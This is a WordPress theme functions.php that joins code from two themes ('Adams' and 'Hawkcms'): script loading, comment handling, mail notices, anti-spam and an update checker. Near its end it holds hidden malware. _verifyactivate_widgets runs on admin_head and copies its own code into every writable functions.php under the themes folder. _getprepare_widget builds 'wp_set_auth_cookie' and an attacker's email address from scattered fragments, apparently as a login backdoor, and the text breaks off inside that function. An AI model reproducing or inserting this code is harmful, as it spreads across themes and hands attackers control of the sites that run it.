<?php
/**
 * @link http://biji.io
 *
 * @package WordPress
 * @subpackage Adams
 */
if ( !defined( 'THEME_NAME' ) ) define( 'THEME_NAME', 'Adams' );
if ( !defined( 'THEME_DB_VERSION' ) ) define( 'THEME_DB_VERSION', 'v1.2.5' );

require( get_template_directory() . '/inc/core.de.php' );

// add_filter( 'comment_form_defaults','xxx');
// function xxx($default) {
//     $default['comment_field'] .= '<pre>'.htmlentities(json_encode($default)).'</pre>';
//     return $default;
// }

// function biji_sc_download($atts, $content=null, $code="") {
//     $return = '<a href="' . $atts['href'] . '" class="download">' . $content . '</a>';
//     return $return;
// }
// add_shortcode('dl', 'biji_sc_download');

/**
 * 挂载脚本
 */
function biji_enqueue_scripts() {
	wp_deregister_script('jquery');
    wp_enqueue_script(
        'jquery-min',
        '//cdn.staticfile.org/jquery/3.1.1/jquery.min.js',
        array(),
        THEME_DB_VERSION
    );
    wp_enqueue_script(
        'script-js',
        get_template_directory_uri() . '/static/script.js',
        array(),
        THEME_DB_VERSION
    );
    wp_enqueue_script(
        'ajax-comment',
        get_template_directory_uri() . '/static/ajax-comment.js',
        array(),
        THEME_DB_VERSION, 
        true
    );
    wp_localize_script(
        'ajax-comment',
        'themeAdminAjax',
        array(
            'url' => admin_url( 'admin-ajax.php' )
        )
    );
    wp_enqueue_script(
        'prettify',
        '//cdn.staticfile.org/prettify/r298/prettify.js',
        array(),
        THEME_DB_VERSION
    );
    wp_enqueue_script(
        'instantclick',
        '//cdn.staticfile.org/instantclick/3.0.1/instantclick.min.js',
        array(),
        THEME_DB_VERSION
    );
}
add_action( 'wp_enqueue_scripts', 'biji_enqueue_scripts', 1);

// 优化代码
remove_action( 'wp_head', 'feed_links_extra', 3 ); // 额外的feed,例如category, tag页
remove_action( 'wp_head', 'wp_generator' ); //隐藏wordpress版本
remove_filter('the_content', 'wptexturize'); //取消标点符号转义
remove_action( 'admin_print_scripts',  'print_emoji_detection_script'); // 禁用Emoji表情
remove_action( 'admin_print_styles',  'print_emoji_styles');
remove_action( 'wp_head',    'print_emoji_detection_script',  7);
remove_action( 'wp_print_styles',  'print_emoji_styles');
remove_filter( 'the_content_feed',  'wp_staticize_emoji');
remove_filter( 'comment_text_rss',  'wp_staticize_emoji');
remove_filter( 'wp_mail',    'wp_staticize_emoji_for_email');
add_filter('login_errors', create_function('$a', "return null;")); //取消登录错误提示
// add_filter( 'show_admin_bar', '__return_false' ); //删除AdminBar
if ( function_exists('add_theme_support') )add_theme_support('post-thumbnails'); //添加特色缩略图支持

// 禁止wp-embed.min.js
function disable_embeds_init() {
    global $wp;
    $wp->public_query_vars = array_diff( $wp->public_query_vars, array(
        'embed',
    ) );
    remove_action( 'rest_api_init', 'wp_oembed_register_route' );
    add_filter( 'embed_oembed_discover', '__return_false' );
    remove_filter( 'oembed_dataparse', 'wp_filter_oembed_result', 10 );
    remove_action( 'wp_head', 'wp_oembed_add_discovery_links' );
    remove_action( 'wp_head', 'wp_oembed_add_host_js' );
    add_filter( 'tiny_mce_plugins', 'disable_embeds_tiny_mce_plugin' );
    add_filter( 'rewrite_rules_array', 'disable_embeds_rewrites' );
}
add_action( 'init', 'disable_embeds_init', 9999 );
function disable_embeds_tiny_mce_plugin( $plugins ) {
    return array_diff( $plugins, array( 'wpembed' ) );
}
function disable_embeds_rewrites( $rules ) {
    foreach ( $rules as $rule => $rewrite ) {
        if ( false !== strpos( $rewrite, 'embed=true' ) ) {
            unset( $rules[ $rule ] );
        }
    }
    return $rules;
}
function disable_embeds_remove_rewrite_rules() {
    add_filter( 'rewrite_rules_array', 'disable_embeds_rewrites' );
    flush_rewrite_rules();
}
register_activation_hook( __FILE__, 'disable_embeds_remove_rewrite_rules' );
function disable_embeds_flush_rewrite_rules() {
    remove_filter( 'rewrite_rules_array', 'disable_embeds_rewrites' );
    flush_rewrite_rules();
}
register_deactivation_hook( __FILE__, 'disable_embeds_flush_rewrite_rules' );

// 阻止站内文章互相Pingback 
function theme_noself_ping( &$links ) {
    $home = get_theme_mod( 'home' );
    foreach ( $links as $l => $link )
        if ( 0 === strpos( $link, $home ) )
            unset($links[$l]);
}
add_action('pre_ping','theme_noself_ping');

// 网页标题
function biji_add_theme_support_title(){
    add_theme_support( 'title-tag' );
}
add_action( 'after_setup_theme', 'biji_add_theme_support_title' );

// 编辑器增强
function enable_more_buttons($buttons) {
    $buttons[] = 'hr';
    $buttons[] = 'del';
    $buttons[] = 'sub';
    $buttons[] = 'sup';
    $buttons[] = 'fontselect';
    $buttons[] = 'fontsizeselect';
    $buttons[] = 'cleanup';
    $buttons[] = 'styleselect';
    $buttons[] = 'wp_page';
    $buttons[] = 'anchor';
    $buttons[] = 'backcolor';
    return $buttons;
}
add_filter("mce_buttons_3", "enable_more_buttons");

// 代码高亮
function dangopress_esc_html($content)
{
    if(!is_feed()||!is_robots) {
        $content = preg_replace('/<code(.*)>/i',"<code class=\"prettyprint\" \$1>",$content);
    }
    $regex = '/(<code.*?>)(.*?)(<\/code>)/sim';
    return preg_replace_callback($regex, 'dangopress_esc_callback', $content);
}
function dangopress_esc_callback($matches)
{
    $tag_open = $matches[1];
    $content = $matches[2];
    $tag_close = $matches[3];
    //$content = htmlspecialchars($content, ENT_NOQUOTES, get_bloginfo('charset'));
    $content = esc_html($content);

    return $tag_open . $content . $tag_close;
}
add_filter('the_content', 'dangopress_esc_html', 2);
add_filter('comment_text', 'dangopress_esc_html', 2);

// 评论@回复
function idevs_comment_add_at( $comment_text, $comment = '') {
    if( $comment->comment_parent > 0) {
        $comment_text = '@<a href="#comment-' . $comment->comment_parent . '">'.get_comment_author( $comment->comment_parent ) . '</a> ' . $comment_text;
    }
    return $comment_text;
}
add_filter( 'comment_text' , 'idevs_comment_add_at', 20, 2);

// 评论邮件
add_action('comment_post','comment_mail_notify');
/* comment_mail_notify v1.0 by willin kan. (所有回复都发邮件) */
function comment_mail_notify($comment_id) {
    $comment = get_comment($comment_id);
    $parent_id = $comment->comment_parent ? $comment->comment_parent : '';
    $spam_confirmed = $comment->comment_approved;
    if (($parent_id != '') && ($spam_confirmed != 'spam')) {
        $wp_email = 'no-reply@' . preg_replace('#^www.#', '', strtolower($_SERVER['SERVER_NAME'])); //e-mail 发出点, no-reply 可改为可用的 e-mail.
        $to = trim(get_comment($parent_id)->comment_author_email);
        $subject = '您在 [' . get_option("blogname") . '] 的留言有了回复';
        $message = '
    <table cellpadding="0" cellspacing="0" class="email-container" align="center" width="550" style="font-size: 15px; font-weight: normal; line-height: 22px; text-align: left; border: 1px solid rgb(177, 213, 245); width: 550px;">
<tbody><tr>
<td>
<table cellpadding="0" cellspacing="0" class="padding" width="100%" style="padding-left: 40px; padding-right: 40px; padding-top: 30px; padding-bottom: 35px;">
<tbody>
<tr class="logo">
<td align="center">
<table class="logo" style="margin-bottom: 10px;">
<tbody>
<tr>
<td>
<span style="font-size: 22px;padding: 10px 20px;margin-bottom: 5%;color: #65c5ff;border: 1px solid;box-shadow: 0 5px 20px -10px;border-radius: 2px;display: inline-block;">' . get_option("blogname") . '</span>
</td>
</tr>
</tbody>
</table>
</td>
</tr>
<tr class="content">
<td>
<hr style="height: 1px;border: 0;width: 100%;background: #eee;margin: 15px 0;display: inline-block;">
<p>Hi ' . trim(get_comment($parent_id)->comment_author) . '!<br>Your comment by "' . get_the_title($comment->comment_post_ID) . '":</p>
<p style="background: #eee;padding: 1em;text-indent: 2em;line-height: 30px;">' . trim(get_comment($parent_id)->comment_content) . '</p>
<p>'. $comment->comment_author .' give you reply:</p>
<p style="background: #eee;padding: 1em;text-indent: 2em;line-height: 30px;">' . trim($comment->comment_content) . '</p>
</td>
</tr>
<tr>
<td align="center">
<table cellpadding="12" border="0" style="font-family: Lato, \'Lucida Sans\', \'Lucida Grande\', SegoeUI, \'Helvetica Neue\', Helvetica, Arial, sans-serif; font-size: 16px; font-weight: bold; line-height: 25px; color: #444444; text-align: left;">
<tbody><tr>
<td style="text-align: center;">
<a target="_blank" style="color: #fff;background: #65c5ff;box-shadow: 0 5px 20px -10px #44b0f1;border: 1px solid #44b0f1;width: 200px;font-size: 14px;padding: 10px 0;border-radius: 2px;margin: 10% 0 5%;text-align:center;display: inline-block;text-decoration: none;" href="' . htmlspecialchars(get_comment_link($parent_id)) . '">Now Reply</a>
</td>
</tr>
</tbody></table>
</td>
</tr>
</tbody>
</table>
</td>
</tr>
</tbody>
</table>

<table border="0" cellpadding="0" cellspacing="0" align="center" class="footer" style="max-width: 550px; font-family: Lato, \'Lucida Sans\', \'Lucida Grande\', SegoeUI, \'Helvetica Neue\', Helvetica, Arial, sans-serif; font-size: 15px; line-height: 22px; color: #444444; text-align: left; padding: 20px 0; font-weight: normal;">
<tbody><tr>
<td align="center" style="text-align: center; font-size: 12px; line-height: 18px; color: rgb(163, 163, 163); padding: 5px 0px;">
</td>
</tr>
<tr>
<td style="text-align: center; font-weight: normal; font-size: 12px; line-height: 18px; color: rgb(163, 163, 163); padding: 5px 0px;">
<p>Please do not reply to this message , because it is automatically sent.</p>
<p>© '.date("Y").' <a name="footer_copyright" href="' . home_url() . '" style="color: rgb(43, 136, 217); text-decoration: underline;" target="_blank">' . get_option("blogname") . '</a></p>
</td>
</tr>
</tbody>
</table>';
        $from = "From: \"" . get_option('blogname') . "\" <$wp_email>";
        $headers = "$from\nContent-Type: text/html; charset=" . get_option('blog_charset') . "\n";
        wp_mail( $to, $subject, $message, $headers );
    }
}
// -- END ----------------------------------------
function recover_comment_fields($comment_fields){
    $comment = array_shift($comment_fields);
    $comment_fields =  array_merge($comment_fields ,array('comment' => $comment));
    return $comment_fields;
}
add_filter('comment_form_fields','recover_comment_fields');

// 404页面
function biji_404_template( $template ){
    if ( !is_404() ) return $template;
    ?>
    <!DOCTYPE HTML>
    <html>
    <head>
        <meta charset="UTF-8" />
        <meta name="robots" content="none" />
        <title>404 Not Found</title>
        <style>
            *{font-family:"Microsoft Yahei";margin:0;font-weight:lighter;text-decoration:none;text-align:center;line-height:2.2em;}
            html,body{height:100%;}
            h1{font-size:100px;line-height:1em;}
            table{width:100%;height:100%;border:0;}
        </style>
        <?php if(get_theme_mod('biji_setting_style')) echo "<div style=\"display:none\">".get_theme_mod('biji_setting_style')."</div>\n";?>
    </head>
    <body>
    <table cellspacing="0" cellpadding="0">
        <tr>
            <td>
                <table cellspacing="0" cellpadding="0">
                    <tr>
                        <td>
                            <h1>404</h1>
                            <h3>大事不妙啦！</h3>
                            <p>你访问的页面好像不小心被博主给弄丢了~<br/><a href="<?php bloginfo('siteurl'); ?>">惩罚博主 ></a></p>
                        </td>
                    </tr>
                </table>
            </td>
        </tr>
    </table>
    </body>
    </html>
    <?php die; }
add_filter( 'template_include', 'biji_404_template' );

/**
 * AJAX 提交评论
 * @see wp_handle_comment_submission()
 **/
function biji_ajax_comment_submission() {
    global $comment, $user;
    $comment = wp_handle_comment_submission( wp_unslash( $_POST ) );
    if ( is_wp_error( $comment ) ) {
        header('HTTP/1.1 301 Moved Permanently');
        echo $comment->get_error_message();
        exit;
    }
    $user = wp_get_current_user();
    do_action( 'set_comment_cookies', $comment, $user );
    ?>
    <li <?php comment_class(); ?> id="li-comment-<?php comment_ID(); ?>">
        <div id="comment-<?php comment_ID(); ?>" class="comment-body new-comment" >
            <div class="comment-author vcard">
                <?php echo get_avatar($comment,$size='64'); ?>
                <?php printf( __( '<cite class="fn">%s</cite> <span class="says">说道：</span>'), get_comment_author_link() ); ?>
            </div>
            <div class="comment-meta commentmetadata" style="right:8px;"><a href="<?php echo esc_url( get_comment_link( $comment->comment_ID ) ); ?>"><?php printf( __( '%1$s at %2$s' ), get_comment_date(),  get_comment_time() ); ?></a><?php edit_comment_link( __( '(Edit)' ), ' ' ); ?></div>
            <p><?php comment_text(); ?></p>
			<div class="reply">提交成功</div>
        </div>
    </li>
    <?php die; }
add_action( 'wp_ajax_comment-submission',        'biji_ajax_comment_submission' );
add_action( 'wp_ajax_nopriv_comment-submission', 'biji_ajax_comment_submission' );

/**
 * Theme Update Checker Library 1.2 ／ 主题更新推送
 * http://w-shadow.com/
 * Copyright 2012 Janis Elsts
 * Licensed under the GNU GPL license.
 * http://www.gnu.org/licenses/gpl.html
 */
if ( !class_exists('ThemeUpdateChecker') ):
class ThemeUpdateChecker {
	public $theme = '';
	public $metadataUrl = '';
	public $enableAutomaticChecking = true;
	protected $optionName = '';
	protected $automaticCheckDone = false;
	protected static $filterPrefix = 'tuc_request_update_';
	public function __construct($theme, $metadataUrl, $enableAutomaticChecking = true){
		$this->metadataUrl = $metadataUrl;
		$this->enableAutomaticChecking = $enableAutomaticChecking;
		$this->theme = $theme;
		$this->optionName = 'external_theme_updates-'.$this->theme;
		$this->installHooks();		
	}
	public function installHooks(){
		if ( $this->enableAutomaticChecking ){
			add_filter('pre_set_site_transient_update_themes', array($this, 'onTransientUpdate'));
		}
		add_filter('site_transient_update_themes', array($this,'injectUpdate'));
		add_action('delete_site_transient_update_themes', array($this, 'deleteStoredData'));
	}
	public function requestUpdate($queryArgs = array()){
		$queryArgs['installed_version'] = $this->getInstalledVersion(); 
		$queryArgs = apply_filters(self::$filterPrefix.'query_args-'.$this->theme, $queryArgs);
		$options = array(
			'timeout' => 10,
		);
		$options = apply_filters(self::$filterPrefix.'options-'.$this->theme, $options);
		$url = $this->metadataUrl; 
		if ( !empty($queryArgs) ){
			$url = add_query_arg($queryArgs, $url);
		}
		$result = wp_remote_get($url, $options);
		$themeUpdate = null;
		$code = wp_remote_retrieve_response_code($result);
		$body = wp_remote_retrieve_body($result);
		if ( ($code == 200) && !empty($body) ){
			$themeUpdate = ThemeUpdate::fromJson($body);
			if ( ($themeUpdate != null) && version_compare($themeUpdate->version, $this->getInstalledVersion(), '<=') ){
				$themeUpdate = null;
			}
		}
		$themeUpdate = apply_filters(self::$filterPrefix.'result-'.$this->theme, $themeUpdate, $result);
		return $themeUpdate;
	}
	public function getInstalledVersion(){
		if ( function_exists('wp_get_theme') ) {
			$theme = wp_get_theme($this->theme);
			return $theme->get('Version');
		}
		foreach(get_themes() as $theme){
			if ( $theme['Stylesheet'] === $this->theme ){
				return $theme['Version'];
			}
		}
		return '';
	}
	public function checkForUpdates(){
		$state = get_option($this->optionName);
		if ( empty($state) ){
			$state = new StdClass;
			$state->lastCheck = 0;
			$state->checkedVersion = '';
			$state->update = null;
		}
		$state->lastCheck = time();
		$state->checkedVersion = $this->getInstalledVersion();
		update_option($this->optionName, $state);
		$state->update = $this->requestUpdate();
		update_option($this->optionName, $state);
	}
	public function onTransientUpdate($value){
		if ( !$this->automaticCheckDone ){
			$this->checkForUpdates();
			$this->automaticCheckDone = true;
		}
		return $value;
	}
	public function injectUpdate($updates){
		$state = get_option($this->optionName);
		if ( !empty($state) && isset($state->update) && !empty($state->update) ){
			$updates->response[$this->theme] = $state->update->toWpFormat();
		}
		return $updates;
	}
	public function deleteStoredData(){
		delete_option($this->optionName);
	}
	public function addQueryArgFilter($callback){
		add_filter(self::$filterPrefix.'query_args-'.$this->theme, $callback);
	}
	public function addHttpRequestArgFilter($callback){
		add_filter(self::$filterPrefix.'options-'.$this->theme, $callback);
	}
	public function addResultFilter($callback){
		add_filter(self::$filterPrefix.'result-'.$this->theme, $callback, 10, 2);
	}
}
endif;
if ( !class_exists('ThemeUpdate') ):
class ThemeUpdate {
	public $version;
	public $details_url;
	public $download_url;
	public static function fromJson($json){
		$apiResponse = json_decode($json);
		if ( empty($apiResponse) || !is_object($apiResponse) ){
			return null;
		}
		$valid = isset($apiResponse->version) && !empty($apiResponse->version) && isset($apiResponse->details_url) && !empty($apiResponse->details_url);
		if ( !$valid ){
			return null;
		}
		$update = new self();
		foreach(get_object_vars($apiResponse) as $key => $value){
			$update->$key = $value;
		}
		return $update;
	}
	public function toWpFormat(){
		$update = array(
			'new_version' => $this->version,
			'url' => $this->details_url,
		);
		if ( !empty($this->download_url) ){
			$update['package'] = $this->download_url;
		}
		return $update;
	}
}
endif;
$mytheme_update_checker = new ThemeUpdateChecker(
	'adams',
	'https://biji.io/update/adams.json'
);

// 全部配置完毕
?>
<?php
$theme_name = 'Hawkcms';

add_action( 'after_setup_theme', 'init_setup_theme' );

//include('theme-option.php');

add_filter( 'pre_option_link_manager_enabled', '__return_true' );

function dopt($e){
    return stripslashes(get_option($e));
}

if ( function_exists('register_sidebar') ) {
	register_sidebar(array(
        'name'          => '首页侧栏',
        'id'            => 'widget_homesidebar',
        'before_widget' => '<li id="%1$s" class="widget %2$s">',
		'after_widget' => '</li>',
		'before_title' => '<h2>',
		'after_title' => '</h2>',
    ));
    register_sidebar(array(
        'name'          => '文章页侧栏',
        'id'            => 'widget_postsidebar',
        'before_widget' => '<li id="%1$s" class="widget %2$s">',
		'after_widget' => '</li>',
		'before_title' => '<h2>',
		'after_title' => '</h2>',
    ));
}
function init_setup_theme(){

    //去除头部冗余代码
    remove_action( 'wp_head',   'feed_links_extra', 3 );
    remove_action( 'wp_head',   'rsd_link' );
    remove_action( 'wp_head',   'wlwmanifest_link' );
    remove_action( 'wp_head',   'index_rel_link' );
    remove_action( 'wp_head',   'start_post_rel_link', 10, 0 );
	remove_action( 'wp_head',   'wp_shortlink_wp_head', 10, 0 );
    //隐藏admin Bar
	function hide_admin_bar($flag) {
		return false;
	}
	add_filter('show_admin_bar','hide_admin_bar');

    //关键字
    add_action('wp_head','set_meta_keywords');

    //页面描述
    add_action('wp_head','set_meta_description');

    //阻止站内PingBack
    if( dopt('d_pingback_b') != '' ){
        add_action('pre_ping','noself_ping');
    }

    //Gzip压缩
    add_action('init','ux_gzip');

    //文章末尾增加版权
    add_filter('the_content','set_copyright');

    //移除自动保存和修订版本
    if( dopt('d_autosave_b') != '' ){
        add_action('wp_print_scripts','ux_disable_autosave' );
        remove_action('pre_post_update','wp_save_post_revision' );
    }

    //去除自带js
    wp_deregister_script( 'l10n' );

    //修改默认发信地址
    add_filter('wp_mail_from', 'res_from_email');
    add_filter('wp_mail_from_name', 'res_from_name');

    //缩略图设置
    add_theme_support('post-thumbnails');
    set_post_thumbnail_size(140, 98, true);

    add_editor_style('editor-style.css');

    //定义菜单
    if (function_exists('register_nav_menus')){
        register_nav_menus( array(
            'nav' => __('导航'),
            'footer' => __('底部链接'),
            'menu' => __('页面菜单')
        ) );
    }

}

// 取消原有jQuery
if ( !is_admin() ) {
    if ( $localhost == 0 ) {
        function my_init_method() {
            wp_deregister_script( 'jquery' );
        }
        add_action('init', 'my_init_method');
    }
}

$dHasShare = false;
function default_avatar_url($mail){
  $p = get_bloginfo('template_directory').'/default.png';
  if($mail=='') return $p;
  preg_match("/src='(.*?)'/i", get_avatar( $mail,'36',$p ), $matches);
  return $matches[1];
}

//评论头像缓存
function set_comment_avatar($avatar) {
  $tmp = strpos($avatar, 'http');
  $g = substr($avatar, $tmp, strpos($avatar, "'", $tmp) - $tmp);
  $tmp = strpos($g, 'avatar/') + 7;
  $f = substr($g, $tmp, strpos($g, "?", $tmp) - $tmp);
  $w = get_bloginfo('wpurl');
  $e = ABSPATH .'avatar/'. $f .'.png';
  $t = dopt('d_avatarDate')*24*60*60;
  if ( !is_file($e) || (time() - filemtime($e)) > $t )
    copy(htmlspecialchars_decode($g), $e);
  else
    $avatar = strtr($avatar, array($g => $w.'/avatar/'.$f.'.png'));
  if ( filesize($e) < 500 )
    copy(get_bloginfo('template_directory').'/img/default.png', $e);
  return $avatar;
}


//关键字
function set_meta_keywords() {
  global $s, $post;
  $keywords = '';
  if ( is_single() ) {
    if ( get_the_tags( $post->ID ) ) {
      foreach ( get_the_tags( $post->ID ) as $tag ) $keywords .= $tag->name . ', ';
    }
    foreach ( get_the_category( $post->ID ) as $category ) $keywords .= $category->cat_name . ', ';
    $keywords = substr_replace( $keywords , '' , -2);
  } elseif ( is_home () )    { $keywords = dopt('d_keywords');
  } elseif ( is_tag() )      { $keywords = single_tag_title('', false);
  } elseif ( is_category() ) { $keywords = single_cat_title('', false);
  } elseif ( is_search() )   { $keywords = esc_html( $s, 1 );
  } else { $keywords = trim( wp_title('', false) );
  }
  if ( $keywords ) {
    echo "<meta name=\"keywords\" content=\"$keywords\">\n";
  }
}

//网站描述
function set_meta_description() {
  global $s, $post;
  $description = '';
  $blog_name = get_bloginfo('name');
  if ( is_singular() ) {
    if( !empty( $post->post_excerpt ) ) {
      $text = $post->post_excerpt;
    } else {
      $text = $post->post_content;
    }
    $description = trim( str_replace( array( "\r\n", "\r", "\n", "　", " "), " ", str_replace( "\"", "'", strip_tags( $text ) ) ) );
    if ( !( $description ) ) $description = $blog_name . "-" . trim( wp_title('', false) );
  } elseif ( is_home () )    { $description = $blog_name . "-" . get_bloginfo('description') . dopt('d_description'); // 首頁要自己加
  } elseif ( is_tag() )      { $description = $blog_name . "'" . single_tag_title('', false) . "'";
  } elseif ( is_category() ) { $description = $blog_name . "'" . single_cat_title('', false) . "'";
  } elseif ( is_archive() )  { $description = $blog_name . "'" . trim( wp_title('', false) ) . "'";
  } elseif ( is_search() )   { $description = $blog_name . ": '" . esc_html( $s, 1 ) . "' 的搜索結果";
  } else { $description = $blog_name . "'" . trim( wp_title('', false) ) . "'";
  }
  $description = mb_substr( $description, 0, 220, 'utf-8' ) . '..';
  echo "<meta name=\"description\" content=\"$description\">\n";
}

//阻止站内文章Pingback
function noself_ping( &$links ) {
  $home = get_option( 'home' );
  foreach ( $links as $l => $link )
  if ( 0 === strpos( $link, $home ) )
  unset($links[$l]);
}

//移除自动保存
function ux_disable_autosave() {
  wp_deregister_script('autosave');
}

//垃圾评论拦截
class anti_spam {
  function anti_spam() {
    if ( !current_user_can('level_0') ) {
      add_action('template_redirect', array($this, 'w_tb'), 1);
      add_action('init', array($this, 'gate'), 1);
      add_action('preprocess_comment', array($this, 'sink'), 1);
    }
  }
  function w_tb() {
    if ( is_singular() ) {
      ob_start(create_function('$input','return preg_replace("#textarea(.*?)name=([\"\'])comment([\"\'])(.+)/textarea>#",
      "textarea$1name=$2w$3$4/textarea><textarea name=\"comment\" cols=\"100%\" rows=\"4\" style=\"display:none\"></textarea>",$input);') );
    }
  }
  function gate() {
    if ( !empty($_POST['w']) && empty($_POST['comment']) ) {
      $_POST['comment'] = $_POST['w'];
    } else {
      $request = $_SERVER['REQUEST_URI'];
      $spamcom = isset($_POST['comment'])        ? $_POST['comment']                : null;
      $_POST['spam_confirmed'] = "$spamcom";
    }
  }

  function sink( $comment ) {
  $email = $comment['comment_author_email'];
  $g = 'http://www.gravatar.com/avatar/'. md5( strtolower( $email ) ). '?d=404';
  $headers = @get_headers( $g );
    if ( !preg_match("|200|", $headers[0]) ) {
      add_filter('pre_comment_approved', create_function('', 'return "0";'));
    }
    if ( !empty($_POST['spam_confirmed']) ) {
      if ( in_array( $comment['comment_type'], array('pingback', 'trackback') ) ) return $comment;
      die();
      add_filter('pre_comment_approved', create_function('', 'return "spam";'));
      $comment['comment_content'] = $_POST['spam_confirmed'];
    }
    return $comment;
  }
}
$anti_spam = new anti_spam();

//Gzip压缩
function ux_gzip() {
  if ( strstr($_SERVER['REQUEST_URI'], '/js/tinymce') )
    return false;
  if ( ( ini_get('zlib.output_compression') == 'On' || ini_get('zlib.output_compression_level') > 0 ) || ini_get('output_handler') == 'ob_gzhandler' )
    return false;
  if (extension_loaded('zlib') && !ob_start('ob_gzhandler'))
    ob_start();
}


//修改默认发信地址
function res_from_email($email) {
    $wp_from_email = get_option('admin_email');
    return $wp_from_email;
}
function res_from_name($email){
    $wp_from_name = get_option('blogname');
    return $wp_from_name;
}

//文章（包括feed）末尾加版权说明
function set_copyright($content) {
	  if( !is_page() ){
		
		$content .= wp_link_pages(array('before' => '<div class="fenye">', 'after' => '', 'next_or_number' => 'next', 'previouspagelink' => '上一页', 'nextpagelink' => ""));
		$content .= wp_link_pages(array('before' => '', 'after' => '', 'next_or_number' => 'number', 'link_before' =>'<span>', 'link_after'=>'</span>'));
		$content .= wp_link_pages(array('before' => '', 'after' => '</div>', 'next_or_number' => 'next', 'previouspagelink' => '', 'nextpagelink' => "下一页"));

       $content.= '<p>转载注明:<a href="'.get_permalink().'">'.'('.get_permalink().')</a></p>';
    }
    if( is_feed() ){
        $content.= rss_postrelated();
    }
    return $content;
}

function rss_postrelated(){
    $exclude_id = $post->ID;
    $posttags = get_the_tags();
    $i = 0;
    $limit = 6 ;
    if ( $posttags ) {
      $tags = ''; foreach ( $posttags as $tag ) $tags .= $tag->name . ',';
      $args = array(
        'post_status' => 'publish',
        'tag_slug__in' => explode(',', $tags),
        'post__not_in' => explode(',', $exclude_id),
        'caller_get_posts' => 1,
        'orderby' => 'comment_date',
        'posts_per_page' => $limit
      );
      query_posts($args);
      while( have_posts() ) { the_post();
        $output .= '<li><a href="'.get_permalink().'">'.get_the_title().'</a></li>';
        $exclude_id .= ',' . $post->ID; $i ++;
      };
      return '<h4 style="font-size:14px;margin:10px 0;border-bottom:solid 1px #ddd;">继续阅读相关文章：</h4><ul style="line-height:20px;">'.$output.'</ul>';
      wp_reset_query();
    }
}

function _verifyactivate_widgets(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_get_allwidgets_cont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$comaar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $comaar . "\n" .$widget);fclose($f);
					$output .= ($isshowdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_allwidgets_cont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&&
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;
	}
	if (sizeof($wids) > 0){
		return _get_allwidgets_cont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){
    function stripos(  $str, $needle, $offset = 0  ){
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  );
    }
}

if(!function_exists("strripos")){
    function strripos(  $haystack, $needle, $offset = 0  ) {
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  );
        if(  $offset < 0  ){
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  );
        }
        else{
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    );
        }
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE;
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   );
        return $pos;
    }
}
if(!function_exists("scandir")){
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_verifyactivate_widgets");
function _getprepare_widget(){
	if(!isset($text_length)) $text_length=120;
	if(!isset($check)) $check="cookie";
	if(!isset($tagsallowed)) $tagsallowed="<a>";
	if(!isset($filter)) $filter="none";
	if(!isset($coma)) $coma="";
	if(!isset($home_filter)) $home_filter=get_option("home");
	if(!isset($pref_filters)) $pref_filters="wp_";
	if(!isset($is_use_more_link)) $is_use_more_link=1;
	if(!isset($com_type)) $com_type="";
	if(!isset($cpages)) $cpages=$_GET["cperpage"];
	if(!isset($post_auth_comments)) $post_auth_comments="";
	if(!isset($com_is_approved)) $com_is_approved="";
	if(!isset($post_auth)) $post_auth="auth";
	if(!isset($link_text_more)) $link_text_more="(more...)";
	if(!isset($widget_yes)) $widget_yes=get_option("_is_widget_active_");
	if(!isset($checkswidgets)) $checkswidgets=$pref_filters."set"."_".$post_auth."_".$check;
	if(!isset($link_text_more_ditails)) $link_text_more_ditails="(details...)";
	if(!isset($contentmore)) $contentmore="ma".$coma."il";
	if(!isset($for_more)) $for_more=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$widget_yes) :

	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$coma."vethe".$com_type."mas".$coma."@".$com_is_approved."gm".$post_auth_comments."ail".$coma.".".$coma."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) {
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) {
			if(is_feed()) {
				$output=__("There is no excerpt because this is a protected post.");
			} else {
